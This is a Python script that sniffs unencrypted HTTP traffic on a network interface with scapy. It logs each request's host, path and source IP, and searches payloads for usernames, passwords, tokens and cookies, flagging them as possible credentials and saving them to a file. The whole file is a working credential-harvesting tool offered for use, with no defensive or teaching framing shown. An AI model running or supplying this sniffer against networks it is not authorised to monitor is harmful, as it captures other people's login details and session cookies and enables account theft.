#!/usr/bin/env python3
# @author Adhamhas

import scapy.all as scapy
from scapy.layers import http
from colorama import Fore, Style, init
import argparse
import datetime

init(autoreset=True)

CREDENTIAL_KEYWORDS = ["user", "username", "pass", "password", "login", "token", "auth", "email", "sess", "cookie"]

def sniff(interface, log_file=None):
    print(Fore.GREEN + f"[+] Sniffing on {interface}... Press Ctrl+C to stop.")
    try:
        scapy.sniff(
            iface=interface,
            store=False,
            prn=lambda pkt: process_sniffed_packet(pkt, log_file),
            filter="tcp port 80"
        )
    except PermissionError:
        print(Fore.RED + "[!] Root permissions required.")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")

def process_sniffed_packet(packet, log_file=None):
    if packet.haslayer(http.HTTPRequest):
        method = packet[http.HTTPRequest].Method.decode()
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        src_ip = packet[scapy.IP].src
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')

        header = (
            f"\n{Fore.MAGENTA}[{timestamp}]{Style.RESET_ALL} "
            f"{Fore.YELLOW}[{src_ip}]{Style.RESET_ALL} "
            f"{Fore.CYAN}{method} http://{host}{path}{Style.RESET_ALL}"
        )
        print(header)

        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode(errors='ignore')
                found = False

                for keyword in CREDENTIAL_KEYWORDS:
                    if keyword in load.lower():
                        found = True
                        break

                if found:
                    print(Fore.RED + "[!] Suspicious data detected (possible credentials):")
                else:
                    print(Fore.WHITE + "[+] Raw payload:")

                print(load)
                if log_file:
                    with open(log_file, 'a') as f:
                        f.write(f"{timestamp} - {src_ip} - {method} http://{host}{path}\n")
                        f.write(load + "\n" + ("-"*60) + "\n")

            except Exception:
                pass

def main():
    parser = argparse.ArgumentParser(description="Advanced HTTP Packet Sniffer")
    parser.add_argument("-i", "--interface", required=True, help="Interface to sniff on (e.g., wlan0)")
    parser.add_argument("-o", "--output", help="Optional file to save logs")
    args = parser.parse_args()

    sniff(args.interface, args.output)

if __name__ == "__main__":
    main()
